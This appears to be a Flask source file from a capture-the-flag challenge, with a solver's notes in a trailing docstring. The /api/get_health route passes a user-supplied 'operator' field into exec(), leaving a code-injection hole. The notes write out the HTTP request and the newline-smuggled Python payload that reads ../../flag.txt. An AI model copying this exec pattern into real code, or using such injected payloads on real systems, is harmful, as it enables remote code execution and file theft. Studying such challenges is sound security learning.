from flask import Blueprint, render_template, request
from application.util import response

web = Blueprint('web', __name__)
api = Blueprint('api', __name__)

@web.route('/')
def index():
    return render_template('index.html')

@api.route('/get_health', methods=['POST'])
def count():
    if not request.is_json:
        return response('Invalid JSON!'), 400

    data = request.get_json()

    current_health = data.get('current_health')
    attack_power = data.get('attack_power')
    operator = data.get('operator')
    
    if not current_health or not attack_power or not operator:
        return response('All fields are required!'), 400

    result = {}
    try:
        code = compile(f'result = {int(current_health)} {operator} {int(attack_power)}', '<string>', 'exec')
        exec(code, result)
        return response(result.get('result'))
    except:
        return response('Something Went Wrong!'), 500

"""
POST /api/get_health HTTP/1.1
Host: 142.93.35.129:30044
Content-Type: application/json
Content-Length: 125

{
"current_health":"400",
"operator":"\nf = open('../../flag.txt', 'r')\nresult=f.read()\na=",
"attack_power":"500"
}

--
translates to:
result = 400
f= open('../../flag.txt')
result = f.read()
a=500

the result of x is complex, but including the variabes 
since it .gets('result') we set result to the output we want
"""